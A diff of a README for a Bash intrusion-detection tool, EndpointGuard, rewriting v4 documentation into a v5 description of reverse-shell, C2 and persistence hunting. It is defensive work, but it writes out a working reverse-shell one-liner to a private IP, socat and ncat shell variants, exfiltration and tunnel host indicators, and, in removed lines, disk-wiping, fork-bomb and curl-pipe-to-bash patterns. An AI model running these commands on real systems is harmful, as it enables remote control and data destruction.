@@ -1,496 +1,235 @@
 <div align="center">
 
-<img src="docs/images/banner.png" alt="EndpointGuard Banner" width="100%">
+# 🛡️ EndpointGuard v5.0 — Linux Sentinel
 
-<br><br>
-
-# 🛡️ EndpointGuard v4.0
-
-### Advanced Endpoint Security with Instant Intrusion Response
-
-<br>
+### Reverse-shell, C2 and persistence hunter for Linux
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)](LICENSE)
 [![Bash](https://img.shields.io/badge/Built_With-Bash-4EAA25?style=for-the-badge&logo=gnu-bash&logoColor=white)](https://www.gnu.org/software/bash/)
 [![Linux](https://img.shields.io/badge/Platform-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://www.linux.org/)
 [![Security](https://img.shields.io/badge/Focus-Cybersecurity-red?style=for-the-badge&logo=hackthebox&logoColor=white)](https://github.com/Mr-N1ck/EndpointGuard)
 [![ShellCheck](https://img.shields.io/badge/ShellCheck-Passing-brightgreen?style=for-the-badge)](https://www.shellcheck.net/)
-[![Stars](https://img.shields.io/github/stars/Mr-N1ck/EndpointGuard?style=for-the-badge&color=yellow)](https://github.com/Mr-N1ck/EndpointGuard/stargazers)
-[![Forks](https://img.shields.io/github/forks/Mr-N1ck/EndpointGuard?style=for-the-badge&color=blue)](https://github.com/Mr-N1ck/EndpointGuard/network/members)
-[![Issues](https://img.shields.io/github/issues/Mr-N1ck/EndpointGuard?style=for-the-badge&color=orange)](https://github.com/Mr-N1ck/EndpointGuard/issues)
 
-<br>
-
-> **A zero-dependency, pure Bash endpoint security daemon that detects intrusions in 2-3 seconds, deploys honeypot traps, and provides instant automated response — built for Linux servers and cybersecurity professionals.**
-
-<br>
-
-[📖 Documentation](#-documentation) •
-[⚡ Quick Start](#-quick-start) •
-[🏗️ Architecture](#%EF%B8%8F-architecture) •
-[🎯 Features](#-features) •
-[📡 Modules](#-14-security-modules) •
-[🤝 Contributing](#-contributing)
-
-<br>
-
----
-
-<img src="docs/images/demo.gif" alt="EndpointGuard Demo" width="85%">
-
-<br>
-
-*Real-time intrusion detection, honeypot deployment, and instant Telegram alerts*
-
----
+> **Pure-Bash endpoint security daemon that hunts active reverse shells, severs C2 channels, quarantines payloads and cleans persistence — all from a single interactive menu. No command arguments. No config editing.**
 
 </div>
 
-<br>
+---
 
-## 🔥 Why EndpointGuard?
+## What v5 actually does
 
-Most endpoint security tools are **bloated**, require **complex dependencies**, or are **expensive commercial products**. EndpointGuard is different:
-
-| Problem | EndpointGuard Solution |
-|---|---|
-| ❌ Complex installation | ✅ Single Bash script — zero dependencies |
-| ❌ Slow detection (minutes) | ✅ **2-3 second** response time |
-| ❌ No self-lockout protection | ✅ Auto-detects owner IPs & sessions |
-| ❌ Binary-only, no transparency | ✅ 100% open source, fully auditable |
-| ❌ Expensive licenses | ✅ Free forever (MIT License) |
-| ❌ Requires agents/frameworks | ✅ Pure Bash — runs on ANY Linux |
-
-<br>
-
-## 🎯 Features
-
-```text
-┌─────────────────────────────────────────────────────────────────┐
-│                    ENDPOINTGUARD v4.0 FEATURES                  │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                 │
-│  🔐 DETECTION              │  ⚡ RESPONSE                      │
-│  ─────────────────          │  ──────────────────                │
-│  • SSH brute force          │  • Instant IP blocking             │
-│  • Reverse shells           │  • Session-specific termination    │
-│  • Privilege escalation     │  • Honeypot jail deployment        │
-│  • File tampering           │  • Account lockdown                │
-│  • Rootkit indicators       │  • Firewall auto-recovery          │
-│  • Crypto miners            │  • PAM-level interception          │
-│  • Persistence mechanisms   │  • Process group kill              │
-│                             │                                    │
-│  🛡️ SAFETY                 │  📡 ALERTING                      │
-│  ─────────────────          │  ──────────────────                │
-│  • 3 safety modes           │  • Real-time Telegram alerts       │
-│  • Owner IP auto-detect     │  • Smart cooldown (no spam)        │
-│  • Self-lockout prevention  │  • Daily summary reports           │
-│  • Trusted user protection  │  • Severity-based urgency          │
-│  • Crash-safe recovery      │  • Multi-format log parsing        │
-│                             │                                    │
-└─────────────────────────────────────────────────────────────────┘
-```
-
-<br>
-
-## 🏗️ Architecture
-
-```text
-                     ┌──────────────────────┐
-                     │   EndpointGuard v4.0  │
-                     │    (Process Group)     │
-                     └──────────┬───────────┘
-                                │
-          ┌─────────────────────┼─────────────────────┐
-          │                     │                     │
-┌─────────▼────────┐  ┌────────▼────────┐  ┌────────▼────────┐
-│  DETECTION LAYER  │  │  RESPONSE LAYER  │  │  SAFETY LAYER   │
-├──────────────────┤  ├─────────────────┤  ├─────────────────┤
-│ SSH Monitor       │  │ IP Blocking      │  │ Owner IP Detect │
-│ PAM Hook (instant)│  │ Session Kill     │  │ Trusted Users   │
-│ Rapid Login (2s)  │  │ Honeypot Jail    │  │ Self-Lockout    │
-│ WTMP Watcher      │  │ Account Lock     │  │  Prevention     │
-│ Process Scanner   │  │ FW Recovery      │  │ Crash Recovery  │
-│ Network Monitor   │  │ Telegram Alert   │  │ Atomic Locking  │
-│ File Integrity    │  │                  │  │ Load Throttling │
-│ Persistence Check │  │                  │  │                 │
-│ Kernel Monitor    │  │                  │  │                 │
-│ Resource Monitor  │  │                  │  │                 │
-└──────────────────┘  └─────────────────┘  └─────────────────┘
-          │                     │                     │
-          └─────────────────────┼─────────────────────┘
-                                │
-                     ┌──────────▼───────────┐
-                     │    LOG & REPORT       │
-                     │  • Atomic file writes │
-                     │  • Auto-rotation      │
-                     │  • Daily reports      │
-                     └──────────────────────┘
-```
-
-<br>
-
-## 📡 14 Security Modules
-
-| # | Module | Detection Method | Response Time |
-|---|--------|-----------------|---------------|
-| 1 | **SSH Login Monitor** | Log tailing (auth.log/secure/journalctl) | ~1 second |
-| 2 | **PAM Hook** | Kernel-level PAM interception | **Instant** |
-| 3 | **Rapid Login Detector** | `who` polling every 2 seconds | 2-3 seconds |
-| 4 | **WTMP Watcher** | `last` command rapid polling | 2-3 seconds |
-| 5 | **SU/Sudo Monitor** | Auth log tailing | ~1 second |
-| 6 | **Process Scanner** | `/proc` enumeration + pattern matching | Adaptive |
-| 7 | **Network Monitor** | `ss` port/connection scanning | Adaptive |
-| 8 | **File Integrity** | SHA-256 checksums / inotifywait | Event-driven* |
-| 9 | **Persistence Detector** | Cron/SSH keys/systemd monitoring | Adaptive |
-| 10 | **Kernel Module Watch** | `lsmod` diffing | Adaptive |
-| 11 | **Resource Abuse** | CPU/process monitoring | Adaptive |
-| 12 | **Anti-Tampering** | Self-integrity + firewall monitoring | Adaptive |
-| 13 | **Honeypot Jail** | Fake environment with activity logging | On-trigger |
-| 14 | **Daily Reporter** | Automated summary generation | 24 hours |
-
-> *Event-driven when `inotifywait` is available; falls back to polling automatically.
-
-<br>
-
-## 🔒 Three Safety Modes
-
-```text
-┌──────────────────────────────────────────────────────────────┐
-│                                                              │
-│  🟢 MONITOR MODE (Default — Zero Risk)                      │
-│  ════════════════════════════════════                        │
-│  • Detects everything, blocks NOTHING                        │
-│  • Perfect for learning and evaluation                       │
-│  • Sends alerts only — no system changes                     │
-│                                                              │
-│  🟡 MODERATE MODE (Recommended for Production)              │
-│  ═════════════════════════════════════════                   │
-│  • Everything in Monitor mode PLUS                           │
-│  • Auto-blocks brute force IPs                               │
-│  • Temporary bans with auto-expiry                           │
-│                                                              │
-│  🔴 ACTIVE MODE (Full Auto-Response)                        │
-│  ════════════════════════════════════                        │
-│  • Everything in Moderate mode PLUS                          │
-│  • Kills malicious processes instantly                       │
-│  • Deploys honeypot jails for intruders                      │
-│  • Locks compromised accounts                                │
-│  • Session-specific termination                              │
-│                                                              │
-└──────────────────────────────────────────────────────────────┘
-```
-
-<br>
-
-
-
-### Manual Start
+When you run a payload like the one below on a v4-protected box, v4 **did not stop it** because it inspected `ps` strings, not file descriptors:
 
 ```bash
-# Clone the repository
+sh -i >& /dev/tcp/192.168.1.17/9001 0>&1
+```
+
+v5 catches this — and every other reverse-shell variant — because it reads `/proc/<pid>/fd` and asks a single question: *"Is this shell process talking to a network socket on stdin/stdout/stderr?"* If yes, it's a reverse shell. End of story. Language doesn't matter.
+
+| Threat | v4 result | v5 result |
+|---|---|---|
+| `bash -i >& /dev/tcp/IP/PORT 0>&1` | ❌ missed once forked | ✅ killed + connection severed + IP blocked |
+| `python -c "...socket.connect()...exec()..."` | ❌ regex miss on argv | ✅ caught via fd inspection |
+| `perl -e "...socket...exec..."` | ❌ regex miss on argv | ✅ caught via fd inspection |
+| `socat TCP:attacker:port EXEC:/bin/bash` | ❌ not in patterns | ✅ caught via fd inspection |
+| `ncat -e /bin/sh attacker port` | ❌ partial regex | ✅ caught via fd inspection |
+| Discord webhook exfil | ❌ not detected | ✅ argv + dropped-file scanner |
+| Telegram bot C2 | ❌ not detected | ✅ argv + dropped-file scanner |
+| ngrok/serveo tunnel | ❌ not detected | ✅ C2 indicator list |
+| Pastebin / 0x0.st / transfer.sh staging | ❌ not detected | ✅ C2 indicator list |
+| Periodic call-home (60s beacon) | ❌ not detected | ✅ beaconing detector |
+| Cron / systemd / .bashrc trojan | ❌ alert only | ✅ alert + clean + quarantine |
+| Live TCP connection after kill | ❌ stays in CLOSE_WAIT | ✅ `ss -K` + `conntrack -D` flush |
+
+---
+
+## Install
+
+```bash
 git clone https://github.com/Mr-N1ck/EndpointGuard.git
 cd EndpointGuard
-
-# Edit configuration (IMPORTANT — set your details first)
-nano src/endpointguard.sh
-
-# Start in monitor mode (safe — no actions taken)
-sudo bash src/endpointguard.sh start
-
-# Check status
-sudo bash src/endpointguard.sh status
-
-# View logs
-sudo bash src/endpointguard.sh logs critical
+sudo bash install.sh
 ```
 
-### Configuration
-
-Before running, edit these values in `src/endpointguard.sh`:
+Then launch the menu:
 
 ```bash
-# Safety Mode — start with "monitor" (alerts only, zero risk)
-SAFETY_MODE="monitor"
-
-# Telegram Alerts (optional but recommended)
-TELEGRAM_BOT_TOKEN="your_bot_token"
-TELEGRAM_CHAT_ID="your_chat_id"
-
-# Your Identity (CRITICAL — prevents self-lockout)
-TRUSTED_USER="your_username"
-TRUSTED_IPS="your.server.ip your.home.ip"
-TRUSTED_NETWORKS="192.168.1.0/24"
+sudo endpointguard
 ```
 
-> 📖 See `docs/CONFIGURATION.md` for complete setup guide.
+That's the entire UX. Every action lives behind a numbered menu item. No flags, no config files to edit, no documentation to skim.
 
-<br>
+---
 
-### 📋 All Commands
+## Main menu
 
-```bash
-sudo bash endpointguard.sh <command>
+```
+   1) Start protection daemon
+   2) Restart protection daemon
+   3) Run on-demand security scan       <- find + kill + quarantine NOW
+   4) Show status
+   5) View logs / blocked / quarantine
+   6) Block IP (manual)
+   7) Unblock IP
+   8) Test Telegram alerts
+   9) Setup / reconfigure
+  10) Install as systemd service (auto-start at boot)
+  11) Uninstall completely
+  12) About / what's new
+   0) Exit
 ```
 
-| Command | Description |
+The first run automatically launches a setup wizard that:
+- detects your username and current SSH source IP
+- pre-fills your local interface IPs
+- detects your LAN subnet
+- asks for a Telegram bot token (or skip with Enter)
+- writes a clean config to `/opt/.epg/config.conf`
+
+You never edit the source script.
+
+---
+
+## Detection techniques
+
+### 1. Reverse-shell hunter — `/proc/<pid>/fd` inspection
+
+Every 3 seconds, EPG walks every PID and checks:
+
+1. Is the binary a shell or interpreter? (bash, sh, dash, zsh, busybox, python, perl, ruby, php, lua, node, awk, socat, ncat, openssl, …)
+2. Are fds 0/1/2 connected to a network socket?
+3. Map the socket inode through `/proc/net/tcp{,6}` to the remote endpoint.
+4. Is the remote not us and not loopback?
+
+If all four are true: **reverse shell**. Kill the PID, kill its children, sever the connection at the kernel (`ss -K` + `conntrack -D`), block the remote IP in INPUT/OUTPUT/FORWARD, and quarantine the originating script.
+
+This works regardless of how the payload was invoked: file, `bash -c`, base64, eval, here-doc, anonymous pipe — fds don't lie.
+
+### 2. C2 and exfil channel detector
+
+Scans every process's `/proc/<pid>/cmdline` and every recently-modified file in `/tmp`, `/var/tmp`, `/dev/shm`, `/home/*` and `/root` for indicators including:
+
+- Discord webhooks (`discord.com/api/webhooks`, all subdomains)
+- Telegram bots (`api.telegram.org/bot`, `t.me`, `telegra.ph`)
+- Tunneling services (`ngrok.io`, `ngrok-free.app`, `serveo.net`, `localtunnel.me`, `loca.lt`, `trycloudflare.com`)
+- Paste/exfil sites (`pastebin.com/raw`, `paste.ee/r/`, `hastebin.com/raw`, `dpaste.com/raw`, `rentry.co`, `transfer.sh`, `0x0.st`, `anonfiles.com`, `bashupload.com`, `termbin.com`, `ix.io`, `envs.sh`, `filebin.net`, `file.io`, `gofile.io`)
+- Out-of-band callbacks (`webhook.site`, `interact.sh`, `oast.fun`, `burpcollaborator.net`, `pipedream.net`, `requestcatcher.com`)
+
+Action: kill the process, quarantine the file, alert.
+
+### 3. Beaconing detector
+
+Records all outbound `ESTABLISHED` connections every 30 seconds. If the same `(remote_ip, binary)` pair appears 4 or more times in a 15-minute window with low interval variance (<30s stddev), it's a beacon. Block the remote.
+
+### 4. Kernel-level connection severing
+
+After a kill, v4 left the TCP connection in `CLOSE_WAIT` because the socket lived in the kernel. v5 uses:
+
+- `ss -K dst <ip>` — the only Linux interface that drops live sockets
+- `conntrack -D -d <ip>` — flush conntrack so the connection cannot resume
+- iptables drop on `INPUT`, `OUTPUT` and `FORWARD`
+
+The attacker's terminal hangs immediately.
+
+### 5. Quarantine system
+
+Malicious files are not deleted (preserves forensics). They're moved to `/opt/.epg/quarantine/` with `chmod 000`, hashed, and logged with their original path. View via menu option 5.
+
+### 6. Deep persistence sweep
+
+Every few minutes, EPG scans:
+
+- `/etc/crontab`, `/etc/cron.{d,hourly,daily,weekly,monthly}`, `/var/spool/cron/`
+- `/etc/rc.local`, `/etc/init.d/`, `/etc/xdg/autostart/`
+- `/etc/profile`, `/etc/profile.d/`, `/etc/bash.bashrc`, `/etc/bashrc`, `/etc/zsh/zshrc`
+- All systemd unit directories
+- Every user's `.bashrc`, `.bash_profile`, `.profile`, `.zshrc`, `.bash_login`, `.bash_logout`, `.config/autostart`, `.ssh/rc`
+- All `~/.ssh/authorized_keys`
+- `/etc/ld.so.preload` (rootkit indicator)
+
+When a malicious entry is found, EPG:
+- For config files: strips the bad lines and keeps a `.epg_pre_clean.<ts>` backup
+- For systemd units: stops, disables, and quarantines
+- For dropped scripts: quarantines whole
+
+### 7. Watchdog + self-healing PAM hook
+
+Every 30 seconds, the watchdog checks each monitor module's PID. If any died, it's restarted. The PAM self-healer reinstalls the hook in `/etc/pam.d/{sshd,login,su}` if the attacker removed it.
+
+### 8. Honeypot redirect for compromised accounts
+
+When a trusted user logs in from an untrusted IP (suggesting a credential theft), EPG redirects only that PTY to a fake environment with logged input, blocks the source IP, and severs the SSH connection — without touching your own active session.
+
+---
+
+## Three safety modes
+
+| Mode | What it does |
 |---|---|
-| `start` | Start the security daemon |
-| `stop` | Stop all monitoring |
-| `restart` | Restart the daemon |
-| `status` | Show current status and statistics |
-| `logs [filter]` | View logs (critical, high, logins, blocked, all) |
-| `block <IP>` | Manually block an IP address |
-| `unblock <IP>` | Remove an IP block |
-| `test` | Test Telegram notification |
-| `install` | Install as systemd service (auto-start on boot) |
-| `uninstall` | Completely remove EndpointGuard |
+| `monitor` | Detect everything, change nothing. Alerts only. Safe to run anywhere. |
+| `moderate` | `monitor` + auto-block brute-force IPs. |
+| `active` | Full response: kill processes, sever connections, block IPs, quarantine files, lock accounts, redirect to honeypot. **Default.** |
 
-<br>
+Set in the menu (option 9). Defaults to `active`.
 
-## 🧠 Technical Deep Dive
+---
 
-### Race Condition Prevention
+## Self-lockout prevention
 
-```text
-Traditional approach (VULNERABLE):
-  1. Check if lockfile exists    ← Another process can
-  2. Create lockfile             ← slip in between steps
-  3. Do work
-  4. Remove lockfile
+At every startup EPG auto-detects:
+- All local interface IPs
+- Your current SSH source IP (`SSH_CLIENT`)
+- All IPs where your trusted user is currently logged in
+- Your configured trusted IPs and networks
 
-EndpointGuard approach (SAFE):
-  1. flock() — atomic kernel-level lock
-  2. Do work
-  3. Lock auto-released
-  (Falls back to mkdir if flock unavailable — also atomic)
+These IPs are hard-allowlisted. EPG will refuse to block them even in active mode. If you log in from a new IP not on this list, you'll see a one-time "Owner Login Detected" alert.
+
+---
+
+## File layout
+
+```
+/opt/.epg/
+├── endpointguard.sh          # main script
+├── config.conf               # auto-generated from setup wizard
+├── epg.log                   # all events
+├── alerts.log                # CRITICAL/HIGH only
+├── blocked.list              # blocked IPs with timestamp + reason
+├── killed_conns.log          # severed connections
+├── quarantine/               # locked malicious files (chmod 000)
+│   └── quarantine.log        # what came from where
+├── honeypot/                 # fake env for jailed users
+├── baselines/                # file hashes, port lists, etc.
+├── locks/                    # flock files
+└── pam_alerts.fifo           # PAM hook → daemon channel
 ```
 
-### Self-Lockout Prevention
+---
 
-```text
-At startup, EndpointGuard automatically detects:
-  ✓ All local interface IPs
-  ✓ Current SSH session source IP
-  ✓ All IPs where trusted user is logged in
-  ✓ Configured trusted IPs and networks
-  → These IPs are NEVER blocked, even in active mode
-```
+## Compatibility
 
-### Crash-Safe Honeypot Recovery
+- Any Linux with kernel 3.x or newer
+- Bash 4.0+
+- Optional but recommended: `flock`, `inotifywait`, `conntrack`, `curl`, `ss`
+- Memory: ~25 MB
+- CPU: negligible (adaptive — backs off automatically under load)
 
-```text
-Before jailing a user:
-  1. Register user in jail registry
-  2. Backup original .bashrc
-  3. Deploy honeypot .bashrc
+---
 
-On startup (after crash):
-  1. Read jail registry
-  2. Restore all .bashrc backups
-  3. Clear registry
-  → No user is ever permanently stuck in a jail
-```
+## License
 
-### Adaptive Resource Management
+MIT — see [LICENSE](LICENSE).
 
-```text
-System Load     Scan Interval Multiplier
-─────────────   ─────────────────────────
-Normal          1x (base interval)
-High (>2x CPU)  2x (slower scanning)
-Very High       4x (minimal scanning)
+## Disclaimer
 
-→ EndpointGuard never overloads your server
-```
+For authorised defensive use only. The author is not responsible for misuse.
 
-<br>
-
-## 🔍 What Gets Detected
-
-### Malicious Patterns (Auto-Kill in Active Mode)
-
-```text
-✗ bash -i >& /dev/tcp/...        (Reverse shells)
-✗ rm -rf / --no-preserve-root    (Destructive commands)
-✗ dd if=/dev/zero of=/dev/sda    (Disk wiping)
-✗ :(){ :|:& };:                  (Fork bombs)
-✗ curl ... | bash                (Remote code execution)
-✗ export HISTSIZE=0              (Anti-forensics)
-✗ python -c 'import socket...'   (Script-based reverse shells)
-```
-
-### What's NEVER Flagged (Whitelist)
-
-```text
-✓ Standard admin tools (vim, nano, grep, awk, sed...)
-✓ Security tools (nmap, metasploit, burpsuite...)
-✓ Development tools (python, gcc, docker, git...)
-✓ System management (systemctl, apt, yum...)
-✓ Your own processes and sessions
-```
-
-<br>
-
-## 📊 Alert Examples
-
-### Telegram Alert — Brute Force
-
-```text
-🔴 EPG [ACTIVE]
-
-Host: production-server
-Time: 2024-01-15 03:42:17
-Level: CRITICAL
-
-BRUTE FORCE
-IP: 45.33.32.156 | User: root | Attempts: 15
-Action: IP blocked for 3600s
-```
-
-### Telegram Alert — Compromised Account
-
-```text
-🚨 EPG [ACTIVE]
-
-Host: production-server
-Time: 2024-01-15 03:42:19
-Level: CRITICAL
-
-🚨 SUSPICIOUS LOGIN TO TRUSTED ACCOUNT 🚨
-User: admin
-IP: 185.220.101.42
-
-⚠️ This IP is NOT in trusted list!
-Action: Blocking IP + redirecting to honeypot in 2 seconds
-```
-
-### Telegram Alert — Daily Report
-
-```text
-ℹ️ EPG [MONITOR]
-
-DAILY REPORT 📊
-Mode: monitor | Events: 1,247
-Critical: 3 | High: 12 | Blocked: 8
-```
-
-<br>
-
-## 🖥️ System Requirements
-
-| Requirement | Minimum | Recommended |
-|---|---|---|
-| **OS** | Any Linux (kernel 3.x+) | Ubuntu 20.04+ / Debian 11+ / RHEL 8+ |
-| **Shell** | Bash 4.0+ | Bash 5.0+ |
-| **Privileges**| Root | Root |
-| **RAM** | ~10 MB | ~25 MB |
-| **CPU** | Negligible | Negligible |
-| **Dependencies**| None (pure Bash) | `inotify-tools`, `flock` (auto-detected) |
-| **Network** | None required | Internet (for Telegram alerts) |
-
-<br>
-
-## 🧪 Testing
-
-```bash
-# Run basic tests
-sudo bash tests/test_basic.sh
-
-# Test detection capabilities (safe — uses monitor mode)
-sudo bash tests/test_detection.sh
-
-# Test safety mechanisms
-sudo bash tests/test_safety.sh
-```
-
-<br>
-
-## 📖 Documentation
-
-| Document | Description |
-|---|---|
-| Installation Guide | Complete setup instructions |
-| Configuration Reference | All options explained |
-| Architecture Overview | How it works internally |
-| Module Reference | Detailed module documentation |
-| Safety Modes | Understanding the three modes |
-| Troubleshooting | Common issues and solutions |
-| Changelog | Version history |
-
-<br>
-
-## 🗺️ Roadmap
-
-- [x] 14 security monitoring modules
-- [x] PAM hook instant detection
-- [x] Crash-safe honeypot jail
-- [x] Atomic locking (flock)
-- [x] Event-driven file monitoring
-- [x] Adaptive resource management
-- [x] Self-lockout prevention
-- [ ] Web dashboard (planned v5.0)
-- [ ] Cluster mode — multi-server (planned v5.0)
-- [ ] YARA rule integration (planned v5.1)
-- [ ] MITRE ATT&CK mapping (planned v5.1)
-- [ ] Slack/Discord webhook support (planned v4.1)
-- [ ] JSON structured logging (planned v4.1)
-
-<br>
-
-## 🤝 Contributing
-
-Contributions are welcome! Please read `CONTRIBUTING.md` before submitting.
-
-```bash
-# Fork → Clone → Branch → Code → Test → PR
-git checkout -b feature/your-feature
-# Make changes
-sudo bash tests/test_basic.sh
-git commit -m "feat: your feature description"
-git push origin feature/your-feature
-# Open Pull Request
-```
-
-<br>
-
-## 📜 License
-
-This project is licensed under the MIT License — see LICENSE for details.
-You are free to use, modify, and distribute this tool for any purpose.
-
-<br>
-
-## ⚠️ Disclaimer
-
-This tool is designed for authorized security monitoring only. Always ensure you have proper authorization before deploying on any system. The author is not responsible for misuse or unauthorized deployment.
-
-<br>
+---
 
 <div align="center">
 
-👨‍💻 **Author**
+Built by **Prince Gaur** ([@Mr-N1ck](https://github.com/Mr-N1ck)) for the Linux security community.
 
-<img src="https://github.com/Mr-N1ck.png" width="120" style="border-radius: 50%">
-<br>
-
-**Prince Gaur** *Cybersecurity Enthusiast & Tool Developer*
-
-<br>
-
-<a href="https://www.linkedin.com/in/mr-n1ck/">
-  <img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
-</a>
-<a href="https://github.com/Mr-N1ck">
-  <img src="https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white" alt="GitHub">
-</a>
-
-<br><br>
-
-If EndpointGuard helps you, consider giving it a ⭐
-
-Built with ❤️ for the cybersecurity community
-<br>
-<img src="https://img.shields.io/badge/Made_in-India_🇮🇳-orange?style=for-the-badge" alt="Made in India">
+If EPG saves your box, leave a ⭐.
 
 </div>
